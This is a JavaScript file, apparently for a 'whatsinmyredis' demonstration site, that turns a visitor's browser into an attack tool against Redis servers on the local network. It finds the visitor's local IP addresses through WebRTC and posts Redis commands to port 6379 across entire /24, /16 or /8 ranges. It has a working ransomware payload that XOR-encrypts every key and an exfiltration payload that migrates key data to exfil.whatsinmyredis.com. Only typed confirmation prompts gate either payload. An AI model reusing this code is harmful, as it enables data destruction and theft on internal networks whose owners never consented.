var remoteServer = "exfil.whatsinmyredis.com";
var tcpPort = "11111";
var delay = 10;
var ipAdders = [];
var key;
var token;

var socket = io("whatsinmyredis.com");

var escapeHTML = function( string ){
    var pre = document.createElement('pre');
    var text = document.createTextNode( string );
    pre.appendChild(text);
    return pre.innerHTML;
}

socket.on('RedisData', function(msg){
    var redisContents = $("#myRedisContents");
    redisContents.html("<h3>Got Redis Key</h3>\n" + escapeHTML(msg["data"]) + "\n" + redisContents.html());
});


var getKey = function(length){
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789;<>,./?{}[]!@#$%^&*(()";

    for( var i=0; i < length; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}


var encryptData = function(targets, key){
    var safety = prompt("Your browser is about to encrypt every redis instance running on " + targets + ", type 'RANSOMEWARE' to continue");
    if(safety != "RANSOMEWARE"){
        return false;
    }
    alert("Save the encryption key in case you need it!");
    var payload = "EVAL 'redis.pcall(\"SET\", \"WIMREncryptionKey\", \"" + key + "\"); for k, v in pairs(redis.call(\"KEYS\", \"*\")) do if v ~= \"WIMREncryptionKey\" then redis.pcall(\"BITOP\", \"XOR\", v, v, \"WIMREncryptionKey\") end end' 0\n\n\n";
    slamTargets(targets, payload);
}


var exfilData = function(targets){
    var safety = prompt("Your browser is about to send redis data running on " + targets + " to a remote server, type 'I AM LIABLE' to continue");
    if(safety != "I AM LIABLE"){
        return false;
    }
    var payload = 'EVAL \'local token = "' + token + '"; local count = 0; for k, v in pairs(redis.call("KEYS", "*")) do count = count + 1; if v ~= "WIMREncryptionKey" and count < 100 then redis.call("SET", token, v .. ":" .. redis.call("GET", v)); redis.pcall("MIGRATE", "' + remoteServer + '", "' + tcpPort + '", token,0,200); end; end; redis.call("DEL", token)\' 0\n\n\n';
    slamTargets(targets, payload);
}

var slamTargets = function(targets, payload){
    if(targets.includes("/")){
        var base = targets.split("/")[0];
        var cidr = targets.split("/")[1];
        var blockOne = base.split(".")[0];
        var blockTwo = base.split(".")[1];
        var blockThree = base.split(".")[2];
        if (cidr == "24"){
            for(var blockFour = 0; blockFour < 256; blockFour++){
                (function(blockFour){
                    setTimeout(function(){
                        jQuery.post("http://" + blockOne + "." + blockTwo + "." + blockThree + "." + blockFour + ":6379", payload, function(data){
                            console.log("wat");
                        });
                    }, blockFour * delay);
                })(blockFour);
            }
        }else if(cidr == "16"){
            for(var blockFour = 0; blockFour < 256; blockFour++){
                for(var blockThree = 0; blockThree < 256; blockThree++){
                    (function(blockFour, blockThree){
                        setTimeout(function(){
                            jQuery.post("http://" + blockOne + "." + blockTwo + "." + blockThree + "." + blockFour + ":6379", payload);
                        }, blockThree * delay);
                    })(blockFour, blockThree);
                }
            }
        }else if(cidr =="8"){
             for(var blockFour = 0; blockFour < 256; blockFour++){
                for(var blockThree = 0; blockThree < 256; blockThree++){
                    for(var blockTwo = 0; blockTwo < 256; blockTwo++){
                        (function(blockFour, blockThree, blockTwo){
                            setTimeout(function(){
                                jQuery.post("http://" + blockOne + "." + blockTwo + "." + blockThree + "." + blockFour + ":6379", payload);
                            }, blockTwo * delay);
                        })(blockFour, blockThree, blockTwo);
                    }
                }
            }  
        }
    }else{
        jQuery.post("http://" + targets + ":6379", payload);
    }
}

var getIP = function(gotIps){
    var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

    if (RTCPeerConnection) (function () {
	var rtc = new RTCPeerConnection({iceServers:[]});
	if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
	    rtc.createDataChannel('', {reliable:false});
	};
	
	rtc.onicecandidate = function (evt) {
	    // convert the candidate to SDP so we can run it through our general parser
	    // see https://twitter.com/lancestout/status/525796175425720320 for details
	    if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
	};
	rtc.createOffer(function (offerDesc) {
	    grepSDP(offerDesc.sdp);
	    rtc.setLocalDescription(offerDesc);
	}, function (e) { console.warn("offer failed", e); });
	
	
	var addrs = Object.create(null);
	addrs["0.0.0.0"] = false;
	function updateDisplay(newAddr) {
	    if (newAddr in addrs) return;
	    else addrs[newAddr] = true;
	    ipAdders = Object.keys(addrs).filter(function (k) { return addrs[k]; });
            gotIps(ipAdders);	
	}
	
	function grepSDP(sdp) {
	    var hosts = [];
	    sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
		if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
		    var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
			addr = parts[4],
			type = parts[7];
		    if (type === 'host') updateDisplay(addr);
		} else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
		    var parts = line.split(' '),
			addr = parts[2];
		    updateDisplay(addr);
		}
	    });
	}
    })();

}


token = getKey(10);
socket.emit('token', token);

var redisApp = angular.module('redisApp', []);
redisApp.controller('mainController', ['$scope', function($scope) {
    key = getKey(10000);
    var selected;
    $scope.key = key;
    $scope.exfilData = exfilData;
    $scope.encryptData = encryptData;
    getIP(function(ips){
        var ipRanges = ["127.0.0.1"];
        selected = ipRanges[0];
        for(index in ips){
            ipRanges.push(ips[index]);
            ipRanges.push(ips[index] + "/24");
            ipRanges.push(ips[index] + "/16");
        }
        $scope.ipData = {
            model: selected,
            availableOptions: ipRanges
        };
        $scope.$apply()
    });
 }]); 
